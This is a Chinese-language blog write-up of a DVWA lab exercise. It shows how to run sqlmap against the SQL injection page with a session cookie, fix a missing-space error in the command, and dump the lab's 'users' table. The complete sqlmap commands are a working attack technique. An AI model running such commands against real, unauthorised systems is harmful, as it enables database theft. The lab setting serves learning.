> 靶场：DVWA_sql injection_low

问题解决：为什么SQLmap有时要带cookie

除手工注入外看到一些师傅还用sqlmap跑了跑，  
遂直接按照做sqli-labs方法直接复制url去了  
![clipboard.png](https://image.3001.net/images/20210803/1627957124_6108a784b4ee6ed358b6b.png!small)结果不太可，，莫得想要的

后来发现（piaowp）：  
SQLMAP直接使用url来进行注入，因为之前没有登录DVWA所以被重定向到login.php界面，直接注入失败

所以学习思路，抓包发现cookie：  
![clipboard.png](https://image.3001.net/images/20210803/1627957317_6108a8458d3a3bb8c609e.png!small)  
了解原理后带上cookie暴起来：

 **tips：命令注意**

√：python2 sqlmap.py -u"http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
--cookie="PHPSESSID=7u0ls6vq17jvi44q79g3p4tij3; security=low" -dbs --batch

×：python2 sqlmap.py -u"http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"--cookie="PHPSESSID=7u0ls6vq17jvi44q79g3p4tij3; security=low" -dbs --batch

发现了吗？  
仅仅是一个空格的问题  
![image.png](https://image.3001.net/images/20210803/1627957424_6108a8b09b7b59f6a0bb7.png!small)但是下面的语句就是不出东西，  
所以 **在使用sqlmap时，如果不确定符号问题直接查，或许问题就在空格或单双横杠问题上**  
![image.png](https://image.3001.net/images/20210803/1627957472_6108a8e096f26c072866b.png!small)
成功暴库  
所以在需要登录的环境中带上cookie进行查询

暴表  
![image.png](https://image.3001.net/images/20210803/1627957608_6108a968b7fba02b76df7.png!small)暴字段  
![image.png](https://image.3001.net/images/20210803/1627957622_6108a976135d9cd63a264.png!small)暴内容（dump牛逼）  
命令：  
`python2 sqlmap.py -u"http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
--cookie="PHPSESSID=7u0ls6vq17jvi44q79g3p4tij3; security=low" --dump -T"users"
-D"dvwa" --batch`  
![image.png](https://image.3001.net/images/20210803/1627957644_6108a98cd70ce880f906a.png!small)搞定

看的我头皮发麻，，一个SQL注入漏洞让人把裤衩子都扒下来了，，，，，

 **新手上路，欢迎各位师傅斧正**

